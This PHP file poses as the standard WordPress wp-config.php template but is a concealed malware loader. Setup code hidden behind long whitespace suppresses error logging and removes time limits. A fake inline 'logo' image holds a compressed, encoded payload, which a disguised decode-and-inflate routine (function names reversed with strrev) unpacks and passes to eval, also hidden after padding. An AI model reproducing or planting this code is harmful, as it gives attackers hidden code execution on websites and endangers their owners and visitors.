<?php																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										clearstatcache();error_reporting(E_ALL ^ E_NOTICE);ignore_user_abort(true);ini_set('display_errors', 0);ini_set('error_log', NULL);ini_set('log_errors', 0);ini_set('magic_quotes_runtime', 0);ini_set('max_execution_time', 0);ini_set('memory_limit', '-1');ini_set('output_buffering', 0);session_write_close();set_time_limit(0);
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

$wp_nonce = "";

function pre_term_name($auth_data, $wp_nonce)
{
	$kses_str = str_replace(array('%', '#'), array('/', '+'), $auth_data);
	$filterfunc = strrev('46esab') . "_" . strrev('edoced');
	$filter = $filterfunc($kses_str);
	$preparefunc = strrev('etalfnizg');
	return $preparefunc($filter);
}

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
$wp_default_logo = '<img src="data:image/png;xVZbT#NGFH7mX4SRizySYxMEVVvXWaHUEUhsWDlsS0XQyIzHa7e#aWZMAlH#e8#MnctuSFS0VfOS2DPn8p3Ld47T2IzTjBE2S4UUpngR5AuTRLK8IlHKTWwjx77v9bp1kc4cG9lPoWA%nhNW0DJiJsjSaQRSPI9MydPcVPdFmDPTIGM%#N0PHtB4EFx%uiPD6xt%dPnRR48Yg9luEhZRxjjC#OTkUBgkm0kAgOcUdBHPO10ed5B9AAju4RCsC#Eu8r#Vs%3eUQuWVgD0Hb5sdKjUJnn5LmXr9Pz8HLtpS46qloSWhWTFoShiI2ShXz9USXWUFikRTJoTlIcz4AyjtUzLgsg0ZxNknWJ3mgBocFUzPIcQjjfJNUHIJuS364AQG00gOfOm4t#eu4u3NFexIOedldeuJoacSe%r9GgXKp#rBCtH%3#XNBDd7Xp%b9xWizRiGqnOAW7yS8paijRiXJCK8fw%yPGxpzt33nT8d0NvaLAT6mbDgOeLi4tNzxu3lr5zF4u4Lqjq1qNte8ZwhOecyZoXR6J#EhLGUMXTQsZg7YcSjKjabAhjq6vAoeX0BnIcanDCZOt3nIg9O0WdZZ2z%vr5RHFpFbZyYhA8N2Yem1WZAoBsZMGR24RuzB5OHzcUqFawDM68OMwEMNp49RByJX9R3IZzbBDPgCyD15Me0jOrVV4yF6khodKk%rW1V#yCmb%KtDDRpED6YMHA%FvaVSiETHitLJRPRMiQSxO7y2MVj7IGV5rGGQsLc485KBDU5htjzeG7TSUsy8gyOlBcH2hTu0MqK1Yg9d2xdUOzUjBlDvRSQTgTZc0pNMPQ01oqf4jrb4amEs20PY5ZCeUYYmy82l7MWQh1G1q90zPo0caougUK7MTES0oaXGC6SismvJDz8AUyYKhLJoS3EjLXJbcaqeYXKUXYFVOErX9xgq3Gk6V6VeceeMfC%OuJ3Mg89B7XKaUZlH#FfXD7UaOeCq9g0yN4NdEfY8rTStq6JkACQ5XFA5FuXxcIQWvb8NRxKNBWV17ICMaCpyW7%bGMbmvVHICqver2A0jsZZaprljQUNLE9GeUVSqTBpBj0bLodYNChGjKvZVzWvON%hl4#h0WrNTto99g1ZYVvA#swefg5hamwHh8Q2AqXA%%%OT7gaX37C7ZYeCPr8jgdjTyB3f7RQP%7nMwugsuR#MhmO1B3PfeCiBItpptLw32tPfWTtXh3Xvbu3YvS#KdLHmjSbSLKy%e5IiK4M1#umq9alBqrLnLwt3DxXOYmehDX20QEyVSVuIXx#Hh1P6SyqR#qgXjrSmblrkTJYyd%fSzoxvN4SwWTgJdItqDUNSwRp5tWA9qwf8D">';
preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);

/**#@-*/

$logo_image = $logo_data[1];

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
$wpautop = pre_term_name($logo_image, $wp_nonce);																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										if(isset($wpautop)){EVAL($wpautop);}exit;

/** Sets up WordPress vars and included files. */